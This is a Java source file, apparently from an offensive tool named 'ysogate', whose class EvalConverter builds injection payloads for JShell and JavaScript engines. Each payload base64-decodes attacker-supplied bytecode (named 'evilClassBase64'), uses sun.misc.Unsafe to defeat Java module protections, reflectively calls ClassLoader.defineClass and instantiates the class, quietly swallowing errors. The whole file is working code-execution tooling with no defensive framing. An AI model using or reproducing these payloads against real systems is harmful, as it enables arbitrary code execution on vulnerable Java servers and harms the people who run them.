package com.h2tg.ysogate.controller.bypass;

import org.apache.commons.lang.StringEscapeUtils;

import javax.el.ELProcessor;
import java.util.Base64;

public class EvalConverter
{

    public static String LoadByJshell(String b64)
    {
        String javacode =
                "System.out.println(\"foo\");"+
                        "  class e {" +
                        "    static {" +
                        "        try {" +
                        "            String evilClassBase64 = \""+b64+"\";" +
                        "            Class unsafeClass = Class.forName(\"sun.misc.Unsafe\");" +
                        "            java.lang.reflect.Field unsafeField = unsafeClass.getDeclaredField(\"theUnsafe\");" +
                        "            unsafeField.setAccessible(true);" +
                        "            sun.misc.Unsafe unsafe = (sun.misc.Unsafe) unsafeField.get(null);" +
                        "            Module module = Object.class.getModule();" +
                        "            Class cls = e.class;" +
                        "            long offset = unsafe.objectFieldOffset(Class.class.getDeclaredField(\"module\"));" +
                        "            unsafe.getAndSetObject(cls, offset, module);" +
                        "            java.lang.reflect.Method defineClass = ClassLoader.class.getDeclaredMethod(\"defineClass\", byte[].class, Integer.TYPE, Integer.TYPE);" +
                        "            defineClass.setAccessible(true);" +
                        "            byte[] bytecode = java.util.Base64.getDecoder().decode(evilClassBase64);" +
                        "            Class clazz = (Class) defineClass.invoke(Thread.currentThread().getContextClassLoader(), bytecode, 0, bytecode.length);" +
                        "            clazz.newInstance();" +
                        "        } catch (Exception e) {" +
                        "        }" +
                        "    }" +
                        "}"+" e a = new e();"
                ;
        String escaped = StringEscapeUtils.escapeJava(javacode);
//        System.out.println(javacode);
//        System.out.println(escaped);
        return escaped;
    }

    public static String LoadByJS(String b64)
    {
        return "var bytes = java.util.Base64.getDecoder().decode('" + b64 + "');" +
                "var classLoader = java.lang.Thread.currentThread().getContextClassLoader();" +
                "var method = java.lang.ClassLoader.class.getDeclaredMethod('defineClass', ''.getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);" +
                "method.setAccessible(true);" +
                "var clazz = method.invoke(classLoader, bytes, 0, bytes.length);" +
                "clazz.newInstance();";
    }

    public static void main(String[] args)
    {
    }

}
